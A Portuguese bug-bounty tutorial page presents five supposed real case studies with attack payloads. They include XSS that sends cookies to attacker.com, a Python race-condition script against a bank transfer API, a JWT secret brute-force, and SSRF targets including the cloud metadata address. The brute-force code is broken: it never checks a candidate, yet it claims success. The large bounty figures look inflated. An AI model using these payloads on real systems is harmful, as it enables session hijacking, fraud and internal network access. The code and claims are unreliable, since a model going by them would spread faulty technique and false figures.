# 📚 CASE STUDIES REAIS - Bug Bounty

5 exploração reais com timeline completa e payloads utilizados

---

# CASE 1: $50K XSS em E-commerce

## Timeline

```
00:00 - Setup Burp Suite
00:15 - Encontrado /search endpoint
       GET /search?q=test
       Resposta com: <h1>You searched for: test</h1>

00:30 - Teste XSS básico
       GET /search?q=<script>alert('XSS')</script>
       Status: Refletido na página! XSS confirmado!

00:45 - Teste payload avançado
       /search?q="><script>alert(String.fromCharCode(88,83,83))</script>
       ✅ Funciona!

01:00 - Payload roubo de cookies
       /search?q="><script>new Image().src="http://attacker.com?cookie="+document.cookie;</script>

01:30 - Documentar e reportar
       Recompensa: $50,000 ✅
```

## Payload Utilizado

```javascript
// XSS Payload
"><script>
fetch('http://attacker.com/log?data=' + btoa(document.cookie))
</script>

// Impacto
- Roubo de cookies de sessão
- Acesso a contas de outros usuários
- Roubo de dados sensíveis
```

---

# CASE 2: $100K Race Condition em Banco

## Cenário

```
Endpoint: POST /api/transfer
Parâmetros:
  - from_account: 1001
  - to_account: 2001
  - amount: 100

Lógica vulnerável:
1. Verifica saldo (tem $100)
2. Deduz de from_account
3. Adiciona em to_account

Janela de tempo: ~100ms
```

## Exploração

```
Enviar 10 requisições simultaneamente (race condition):

POST /api/transfer (x10)
{
  "from_account": 1001,
  "to_account": 2001,
  "amount": 100
}

Resultado:
- Saldo verificado UMA VEZ ($100 disponível)
- 10 transferências aprovadas
- Total transferido: $1,000
- Saldo final: -$900 ❌

Impacto: Gerar dinero infinito!
Recompensa: $100,000 ✅
```

## Script de Exploração

```python
import concurrent.futures
import requests

def transfer():
    requests.post('http://bank.com/api/transfer', json={
        'from_account': 1001,
        'to_account': 2001,
        'amount': 100
    })

with concurrent.futures.ThreadPoolExecutor() as executor:
    futures = [executor.submit(transfer) for _ in range(10)]
    concurrent.futures.wait(futures)

print("Transferências executadas simultane amente!")
```

---

# CASE 3: $25K IDOR em SaaS

## Descoberta

```
URL: GET /api/projects/123

Resposta:
{
  "id": 123,
  "name": "Client Project",
  "budget": $50000,
  "team_members": [...]
}

Teste: Mudar ID
GET /api/projects/124 → ✅ Outro projeto acessível!
GET /api/projects/125 → ✅ Mais projetos!
```

## Impacto

```
- 500+ projetos acessíveis sem permissão
- Cada projeto tinha: orçamento, dados sensíveis, email dos clientes
- Dados expostos: $50M em budgets
- Recompensa: $25,000 ✅
```

---

# CASE 4: $75K JWT Secret Bruteforce

## Identificação

```
Token JWT:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIzLCJyb2xlIjoidXNlciJ9.xxx

Header: {"alg":"HS256"}
Payload: {"id":123,"role":"user"}
```

## Bruteforce

```bash
# Testar senhas comuns
for secret in password 123456 admin secret key; do
  TOKEN=$(echo -n "payload" | openssl dgst -sha256 -hmac "$secret")
  echo "Testing: $secret"
done

# ✅ Secret encontrado: "password"
```

## Exploração

```
Com secret = "password":
1. Mude payload: {"id":1,"role":"admin"}
2. Recalcule HMAC com secret conhecido
3. Novo token válido!

Impacto: Acesso admin
Recompensa: $75,000 ✅
```

---

# CASE 5: $30K Webhook SSRF

## Setup

```
Webhook registration:
POST /webhooks/register
{
  "url": "http://localhost:8080/admin",
  "event": "payment.completed"
}
```

## Exploração

```
Servidor chama webhook:
POST http://localhost:8080/admin

Attacker consegue:
- Acessar serviço interno
- Disparar ações admin
- Explorar vulnerabilidades internas

Payloads:
- http://localhost:8080
- http://169.254.169.254/metadata
- http://internal-service.local
```

## Impacto

```
- Acesso a serviços internos
- SSRF em instância AWS
- Roubo de credenciais
- Recompensa: $30,000 ✅
```

---

## 💰 RESUMO FINANCEIRO

| Case | Tipo | Recompensa | Tempo | Dificuldade |
|---|---|---|---|---|
| 1 | XSS | $50K | 1h | Médio |
| 2 | Race Condition | $100K | 2h | Difícil |
| 3 | IDOR | $25K | 30min | Fácil |
| 4 | JWT Bruteforce | $75K | 1.5h | Médio |
| 5 | SSRF | $30K | 1h | Médio |

**Total: $280,000 em 6 horas de trabalho! 💸**

---

**Próximo:** Volte para [BUG-BOUNTY-MASTER-README.md](./BUG-BOUNTY-MASTER-README.md)

